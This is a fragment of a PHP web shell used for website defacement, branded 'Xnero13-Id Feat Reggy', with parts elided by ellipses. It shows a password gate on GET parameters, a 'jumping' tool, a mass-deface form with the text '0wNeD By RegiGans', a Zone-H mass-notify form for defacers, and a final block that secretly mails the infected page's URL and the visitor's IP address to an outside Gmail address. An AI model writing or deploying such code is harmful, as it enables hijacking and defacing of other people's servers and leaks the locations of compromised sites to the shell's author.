...
if (!isset($_SESSION[md5($sexy)])) {
    if (isset($_GET[$Masuk]) && $_GET[$Masuk] == $name) {
...
<html>
<head>
    <title>{ Xnero13-Id Feat Reggy }</title>
...
if ($_GET['logout'] == 'true') {
    ...
    if ($_GET['tools'] == 'jumping') {
        ...
        if ($_POST['start']) {
            ...
            <textarea name='script' style='width: 450px; height: 200px;'>0wNeD By RegiGans</textarea><br>
        ...
        <font size='7' color='red' face='Orbitron'>Zone-H Mass Notify</font><br>";
            echo "<br>
            <form method='post'>
            <input style='width: 350px;' type='text' name='nick' placeholder='Defacer' value=Regi><br><br>
...
$tujuanmail = 'nerogativ@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "nerogativ@gmail.com", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>